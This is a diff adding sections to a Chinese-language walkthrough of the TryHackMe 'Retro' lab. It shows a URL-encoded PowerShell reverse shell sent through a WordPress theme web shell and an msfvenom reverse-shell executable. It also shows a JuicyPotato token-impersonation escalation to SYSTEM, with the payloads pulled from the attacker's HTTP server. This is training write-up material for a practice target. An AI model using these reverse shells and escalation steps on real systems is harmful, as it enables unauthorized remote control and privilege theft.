@@ -211,6 +211,11 @@ RDP 連上之後先開啟 IE & chrome
 感謝[大神](https://www.hackingarticles.in/retro-tryhackme-walkthrough/)提供訊息
 
 [利用此POC](https://github.com/jas502n/CVE-2019-1388/blob/master/HHUPD.EXE) 先於本機下載後，開 http.server  
+
+意外發現資源回首桶也有該 .exe XDDD
+或許可以直接用就好
+![alt text](image-7.png)
+
 ```bash
 └─$ python3 -m http.server 1234
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
@@ -226,8 +231,10 @@ Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 
 ![alt text](image-6.png)  
 
-> 原諒我試了好幾次，終於成功時，卻忘記截圖了QQ
-> 但後續有截到
+成功畫面
+> 這畫面得來不意QQ 重開了三四次靶機
+
+![alt text](image-9.png)
 
 如果成功會有瀏覽器可以選
 我選 IE 然後跳出此視窗點 OK
@@ -302,6 +309,130 @@ C:\Users\Administrator\Desktop>dir
                2 Dir(s)  30,370,779,136 bytes free
 
 C:\Users\Administrator\Desktop>type root.txt.txt
+79...63
+```
+
+### JuicyPotato
+先感謝[大神](https://blog.whale-tw.com/2024/03/07/retro-thm/)  
+
+確認 PRIVILEGES INFORMATION  
+發現 RDP 的權限不夠
+```bash
+C:\Users\Wade\Downloads>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+改嘗試 wordpress 登入  
+並 windows reverse shell  
+![alt text](image-8.png)  
+
+參考 [此網站](https://www.revshells.com) 取得 windows reverse shell  
+```bash
+http://retro.thm/retro/wp-content/themes/90s-retro/404.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.4.11.38%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
+成功反射 shell
+```bash
+┌──(kali㉿kali)-[/usr/share/webshells/php]
+└─$ nc -nvlp 1234                
+listening on [any] 1234 ...
+connect to [10.4.11.38] from (UNKNOWN) [10.10.4.231] 49830
+whoami
+nt authority\iusr
+PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro> whoami
+nt authority\iusr
+```
+
+這個 user 就有 `SeImpersonatePrivilege`
+```bash
+PS C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled
+
+```
+
+本機先下載 [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)    
+再開 http.server 讓 window 的靶機下載 
+```bash
+┌──(kali㉿kali)-[~/tryhackme/retro]
+└─$ python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.4.231 - - [07/Nov/2025 13:36:59] "GET /JuicyPotato.exe HTTP/1.1" 200 -
+^C
+
+```
+```bash
+PS C:\inetpub\wwwroot\retro\wp-content\themes> powershell -c "Invoke-WebRequest -Uri 'http://10.4.11.38:4444/JuicyPotato.exe' -OutFile 'JuicyPotato.exe'"
+PS C:\inetpub\wwwroot\retro\wp-content\themes> dir
+
+
+    Directory: C:\inetpub\wwwroot\retro\wp-content\themes
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-----        11/6/2025   9:28 PM                90s-retro                     
+d-----        12/8/2019   4:02 PM                twentynineteen                
+d-----        12/8/2019   4:02 PM                twentyseventeen               
+d-----        12/8/2019   4:02 PM                twentysixteen                 
+-a----        5/30/2019   2:55 AM             28 index.php                     
+-a----        11/6/2025   9:37 PM         347648 JuicyPotato.exe  
+```
+
+在本機做一個 reverse.exe 反射執行檔 
+```bash
+└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.4.11.38 lport=4445 -f exe -o reverse.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+```
+
+一樣開 http.server 給靶機下載後  
+執行 JuicyPotato.exe & reverse.exe
+> CLSID/Windows_Server_2016_Standard 可參考[網站](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard)
+
+```bash
+PS C:\inetpub\wwwroot\retro\wp-content\themes> ./JuicyPotato.exe -l 1004 -p C:\inetpub\wwwroot\retro\wp-content\themes\reverse.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1004
+......
+[+] authresult 0
+{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+PS C:\inetpub\wwwroot\retro\wp-content\themes> 
+```
+成功反射 shell  
+且是 admin 權限也取得 root.txt
+```bash
+└─$ nc -nvlp 4445
+listening on [any] 4445 ...
+connect to [10.4.11.38] from (UNKNOWN) [10.10.4.231] 49951
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>type root.txt.txt
+type root.txt.txt
 79...63
 ```
 
@@ -647,6 +778,7 @@ msf6 auxiliary(scanner/http/wordpress_pingback_access) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
+失敗
 
 
 ## 參考
